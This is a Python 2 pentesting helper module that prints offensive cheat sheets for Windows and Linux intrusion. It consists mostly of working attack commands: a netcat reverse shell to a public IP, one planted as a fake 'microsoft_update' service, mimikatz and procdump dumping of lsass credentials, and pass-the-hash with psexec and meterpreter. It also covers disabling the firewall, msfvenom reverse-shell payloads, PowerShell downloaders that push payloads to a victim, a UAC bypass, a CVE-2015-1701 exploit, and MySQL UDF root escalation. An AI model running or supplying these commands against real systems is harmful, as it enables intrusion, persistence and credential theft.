#Programmer: Brent E. Chambers
#Date: 3/10/2017
#Filename: Auxiliary.py
#Description:

descript = """
Auxiliary module that provides procedures and tactics for pentesting
"""


import os
import xmltodict
from sets import Set

def remove_dupes(jaja):
        uniqueList = Set(jaja)
        return uniqueList


def cp_collect():
        master =[]
        while 1:
                host = raw_input("Item: ")
                if host == "done":
                        unique_master = remove_dupes(master)
                        return unique_master
                master.append(host)
        unique_master = remove_dupes(master)
        return unique_master


class auxilary:
    def __init__(self):
        pass

    def windows_useful_cmds(self):
	""" Useful Win commands, postex, pwdump, procdump.exe, etc. """
	text = r"""
	net localgroup Users
	net localgroup Administrators
	search dir/s *.doc
	system("start cmd.exe /k $cmd")
	sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
	/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
	mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
	Procdump.exe -accepteula -ma lsass.exe lsass.dmp
	mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
	C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
	C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
	"""
	print text


    def win_enable_rdp(self):
	""" Enable Windows RDP, enable FW services """
	text = """
	reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
	netsh firewall set service remoteadmin enable
	netsh firewall set service remotedesktop enable
	Turn off windows FW: netsh firewall set opmode disable
	"""
	print text


    def pass_the_hash(self):
	""" Pass the hash technique PTH and Meterpreter """
	text = """
	git clone https://github.com/byt3bl33d3r/pth-toolkit
	pth-winexe -U hash //IP cmd
	
	or

	apt-get install freerdp-x11
	xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

	or

	meterpreter > run post/windows/gather/hashdump
	Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
	msf > use exploit/windows/smb/psexec
	msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
	msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
	msf exploit(psexec) > exploit
	meterpreter > shell
	"""
	print text

    def ssh_pivoting(self):
	""" SSH Pivoting on linux using proxychains """
	text = """
	From One Network to Another
	---------------------------
	
	ssh -D 127.0.0.1:1080 -p 22 user1@IP1
	Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
	proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
	Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
	proxychains commands target

	"""
	print text


    def metasploit_pivot(self):
	""" Perform Metasploit pivot procedure """
	text = """
	route add X.X.X.X 255.255.255.0 1
	use auxiliary/server/socks4a
	run
	proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E
	
	or
	
	# https://www.offensive-security.com/metasploit-unleashed/pivoting/
	meterpreter > ipconfig
	IP Address  : 10.1.13.3
	meterpreter > run autoroute -s 10.1.13.0/24
	meterpreter > run autoroute -p
	10.1.13.0          255.255.255.0      Session 1
	meterpreter > Ctrl+Z
	msf auxiliary(tcp) > use exploit/windows/smb/psexec
	msf exploit(psexec) > set RHOST 10.1.13.2
	msf exploit(psexec) > exploit
	meterpreter > ipconfig
	IP Address  : 10.1.13.2
	"""
	print text

    def win_bof_commands(self):
	""" Buffer overflow technique using pvefindaddr and mona """
	text = """
	msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c
	
	COMMONLY USED BAD CHARACTERS:
	\x00\x0a\x0d\x20                              For http request
	\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)
	
	# Useful Commands:
	pattern create
	pattern offset (EIP Address)
	pattern offset (ESP Address)
	add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )
	
	!pvefindaddr pattern_create 5000
	!pvefindaddr suggest
	!pvefindaddr modules
	!pvefindaddr nosafeseh

	!mona config -set workingfolder C:\Mona\%p
	!mona config -get workingfolder
	!mona mod
	!mona bytearray -b "\x00\x0a"
	!mona pc 5000
	!mona po EIP
	!mona suggest
	"""
	print text


    def ssh_over_tcp(self):
	""" SSH tunneling over TCP technique using socat """
	text = """
	
	# on remote server
	# assuming you want the SCTP socket to listen on port 80/SCTP and sshd is on 22/TCP
	$ socat SCTP-LISTEN:80,fork TCP:localhost:22
	
	# localhost
	# replace SERVER_IP with IP of listening server, and 80 with whatever port the SCTP listener is on :)
	$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
	
	# create socks proxy
	# replace username and -p port value as needed...
	$ ssh -lusername localhost -D 8080 -p 1337
	
	"""
	print text


    def tor_nat_traversal(self):
	""" Tunnelling SSH over the Tor network """
	text = """
	
	# install to server
	$ apt-get install tor torsocks

	# bind ssh to tor service port 80
	# /etc/tor/torrc
	SocksPolicy accept 127.0.0.1
	SocksPolicy accept 192.168.0.0/16
	Log notice file /var/log/tor/notices.log
	RunAsDaemon 1
	HiddenServiceDir /var/lib/tor/ssh_hidden_service/
	HiddenServicePort 80 127.0.0.1:22
	PublishServerDescriptor 0
	$ /etc/init.d/tor start
	$ cat /var/lib/tor/ssh_hidden_service/hostname
	3l5zstvt1zk5jhl662.onion

	# ssh connect from client
	$ apt-get install torsocks
	$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80

	"""
	print text


    def get_system_rshell_win7(self):
	""" Push payload to Win7 system with PS1 technique """
	text = """
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 -f exe > danger.exe

	#show account settings
	net user <login>

	# download psexec to kali
	https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
	
	# upload psexec.exe file onto the victim machine with powershell script
	echo $client = New-Object System.Net.WebClient > script.ps1
	echo $targetlocation = "http://192.168.56.102/PsExec.exe" >> script.ps1
	echo $client.DownloadFile($targetlocation,"psexec.exe") >> script.ps1
	powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1

	# upload danger.exe file onto the victim machine with powershell script
	echo $client = New-Object System.Net.WebClient > script2.ps1
	echo $targetlocation = "http://192.168.56.102/danger.exe" >> script2.ps1
	echo $client.DownloadFile($targetlocation,"danger.exe") >> script2.ps1
	powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1

	# UAC bypass from precompiled binaries:
	https://github.com/hfiref0x/UACME

	# upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe to victim pc with powershell
	echo $client = New-Object System.Net.WebClient > script2.ps1
	echo $targetlocation = "http://192.168.56.102/Akagi64.exe" >> script3.ps1
	echo $client.DownloadFile($targetlocation,"Akagi64.exe") >> script3.ps1
	powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1

	# create listener on kali
	nc -lvp 4444

	# Use Akagi64 to run the danger.exe file with SYSTEM privileges
	Akagi64.exe 1 C:\Users\User\Desktop\danger.exe

	# create listener on kali
	nc -lvp 4444

	# The above step should give us a reverse shell with elevated privileges
	# Use PsExec to run the danger.exe file with SYSTEM privileges
	psexec.exe -i -d -accepteula -s danger.exe
	
	"""
	print text


    def get_system_std_rshell_win7(self):
	""" Get SYSTEM level rshell on Win7 System """
	text = """

	https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051
	https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html
	https://www.exploit-db.com/exploits/37049/
	
	# check the list of patches applied on the target machine
	# to get the list of Hotfixes installed, type in the following command.
	wmic qfe get
	wmic qfe | find "3057191"
	
	# Upload compile exploit to victim machine and run it
	https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe
	
	# by default exploite exec cmd.exe with SYSTEM privileges, we need to change source code to run danger.exe
	# https://github.com/hfiref0x/CVE-2015-1701 download it and navigate to the file "main.c"
	
	# dump clear text password of the currently logged in user using wce.exe
	http://www.ampliasecurity.com/research/windows-credentials-editor/
	wce -w
	
	# dump hashes of other users with pwdump7
	http://www.heise.de/download/pwdump.html
	# we can try online hash cracking tools such crackstation.net

	"""

    def local_priv_escal_mysql(self):
	""" Local privilege escalation through MySQL (get root) """
	text = """

	# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
	$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
	$ gcc -g -c raptor_udf2.c
	$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
	mysql -u root -p
	mysql> use mysql;
	mysql> create table foo(line blob);
	mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
	mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
	mysql> create function do_system returns integer soname 'raptor_udf2.so';
	mysql> select * from mysql.func;
	mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');
	
	user:~$ su -
	Password:
	user:~# whoami
	root
	root:~# id
	uid=0(root) gid=0(root) groups=0(root)

	"""
	print text

    def compile_asm(self):
	""" Compile Assembly code to a binary """
	text = """

	nasm -f elf32 simple32.asm -o simple32.o
	ld -m elf_i386 simple32.o simple32
	
	nasm -f elf64 simple.asm -o simple.o
	ld simple.o -o simple

	"""
	print text
